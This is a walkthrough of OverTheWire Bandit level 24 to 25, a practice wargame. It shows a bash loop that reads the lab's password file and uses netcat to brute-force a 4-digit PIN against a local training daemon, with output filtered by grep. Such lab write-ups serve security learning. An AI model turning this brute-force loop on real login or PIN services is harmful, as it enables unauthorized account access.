# OverTheWire Bandit: Level 24 → Level 25

## Challenge Description

> A daemon is listening on port 30002 and will give you the password for `bandit25` if given the password for the current level (`bandit24`) and a secret numeric 4-digit pin code. There is no way to retrieve the pin code apart from brute-forcing it.

**Goal:** Send the current password together with every possible 4-digit PIN
(0000–9999) to the service, and pick out the correct response.

**Connection:**

    ssh bandit24@bandit.labs.overthewire.org -p 2220

## Concepts Involved

- **Brute-forcing**: trying every possible value in a small search space (here,
  10,000 combinations of a 4-digit PIN) since there is no other way to find it.

- **`nc` (netcat)**: used to send data to the TCP service.

- **Bash loops and `seq`/`printf`**: generate all 4-digit numbers, including
  leading zeros (`0000`, `0001`, ... `9999`).

- **Filtering output with `grep`**: separate the one correct response from
  thousands of "Wrong!" replies.

## Solution

### Step 1: Understand the service
```bash

    bandit24@bandit:~$ nc localhost 30002
    I am waiting for a 4-digit pincode, along with the password.
    Please enter <password> <pincode> separated by a space.
```

Each connection accepts exactly **one** attempt (one line), then closes. This
means we cannot try all 10,000 PINs in a single connection; we must open a new
connection for each guess.

### Step 2: Prepare a working directory
```bash

    bandit24@bandit:~$ cd $(mktemp -d)
```

### Step 3: Generate all possible PINs and try each one

Since each connection only accepts one guess, we loop and open a new
connection per PIN, saving every reply to a file:
```bash

    bandit24@bandit:/tmp/tmp.XXXXXXXXXX$ pass=$(cat /etc/bandit_pass/bandit24)
    bandit24@bandit:/tmp/tmp.XXXXXXXXXX$ for i in $(seq -w 0 9999); do
        echo "$pass $i" | nc -w 1 localhost 30002 >> results.txt
    done
```

**How it works:**

| Part | Meaning |

| `pass=$(cat /etc/bandit_pass/bandit24)` | Stores the current password in a variable |
| `seq -w 0 9999` | Generates `0000` to `9999` with `-w` keeping the leading zeros |
| `echo "$pass $i"` | Builds the line `<password> <pin>` the service expects |
| `nc -w 1 localhost 30002` | Connects, waits at most 1 second for a reply, then closes |
| `>> results.txt` | Appends every response to the same file |

This loop takes a while (10,000 connections), so let it finish before moving on.

### Step 4: Find the correct response

Almost every line in `results.txt` will contain the "wrong" message. Filter
those out:
```bash

    bandit24@bandit:/tmp/tmp.XXXXXXXXXX$ grep -v "Wrong" results.txt
    Correct!
    <bandit25-Password>
```

### Alternative: Filter while generating
```bash

    bandit24@bandit:/tmp/tmp.XXXXXXXXXX$ for i in $(seq -w 0 9999); do
        echo "$pass $i" | nc -w 1 localhost 30002
    done | grep -v "Wrong"
```

This streams the output directly through `grep`, without creating a results file.

## Result

    Password for bandit25: <**********>

## Key Takeaways

- A 4-digit PIN is only 10,000 possibilities, which is small enough to brute-force
  quickly with a simple loop.
- `seq -w` is useful for generating zero-padded number sequences.
- When a protocol only allows one attempt per connection, the brute-force loop
  must re-open the connection for every guess.
- Redirecting all attempts to a file and filtering afterward is often easier
  than trying to catch the right answer "live".